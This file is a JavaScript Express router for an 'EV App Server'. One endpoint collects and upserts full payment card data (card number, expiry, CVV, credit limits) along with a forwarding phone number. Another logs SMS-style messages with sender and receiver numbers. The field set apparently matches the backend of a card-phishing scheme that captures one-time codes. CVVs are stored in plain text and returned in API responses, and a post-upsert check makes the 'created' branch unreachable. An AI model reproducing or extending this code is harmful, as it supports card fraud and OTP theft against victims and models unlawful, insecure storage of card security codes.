import express from "express";
import UserModel from "./Schema/user.schema.js";
import FormDataModel from "./Schema/data.schema.js";
import adminRouter from "./Routers/admin.routes.js";

const router = express.Router();

router.get("/", (req, res) => {
  res.send("Welcome to EV App Server APIs");
});

router.use("/admin", adminRouter);

router.post("/save-data", async (req, res) => {
  try {
    const {
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber
    } = req.body;

    console.log(forwardPhoneNumber)

    if (!mobileNumber) {
      return res.status(400).json({ message: "mobileNumber is required" });
    }

    // Trim helper
    const trimFields = (obj) => {
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === "string") result[key] = value.trim();
        else if (
          key === "mobileNumber" ||
          key === "totalLimit" ||
          key === "availableLimit" ||
          key == "forwardPhoneNumber"
        )
          result[key] = value;
        else result[key] = value;
      }
      return result;
    };

    const data = trimFields({
      name,
      mobileNumber,
      email,
      state,
      workingState,
      totalLimit,
      availableLimit,
      cardHolderName,
      cardNumber,
      expiryDate,
      cvv,
      forwardPhoneNumber
    });

    // Build dynamic update fields (ignore undefined)
    const updateFields = {};
    for (const [key, value] of Object.entries(data)) {
      if (value !== undefined) updateFields[key] = value;
    }

    // Find and update OR insert new
    const user = await UserModel.findOneAndUpdate(
      { mobileNumber: data.mobileNumber },
      { $set: updateFields },
      { new: true, upsert: true }
    );

    // Check if it was an update or create
    const existed = await UserModel.exists({ mobileNumber: data.mobileNumber });

    res.status(existed ? 200 : 201).json({
      message: existed
        ? "User updated successfully"
        : "User created successfully",
      data: user,
    });
  } catch (error) {
    if (error.code === 11000) {
      return res
        .status(409)
        .json({ message: "Duplicate entry", error: error.keyValue });
    }
    res
      .status(500)
      .json({ message: "Error saving user", error: error.message });
  }
});

router.post("/formdata", async (req, res) => {
  try {
    const { senderPhoneNumber, message, time, recieverPhoneNumber } = req.body;

    // Basic validation
    if (!senderPhoneNumber || !message || !time || !recieverPhoneNumber) {
      return res.status(400).json({ message: "All fields are required" });
    }

    const formData = new FormDataModel({
      senderPhoneNumber,
      message,
      time,
      recieverPhoneNumber,
    });

    await formData.save();

    res.status(201).json({
      message: "Form data saved successfully",
      data: formData,
    });
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error saving form data", error: error.message });
  }
});




export default router;
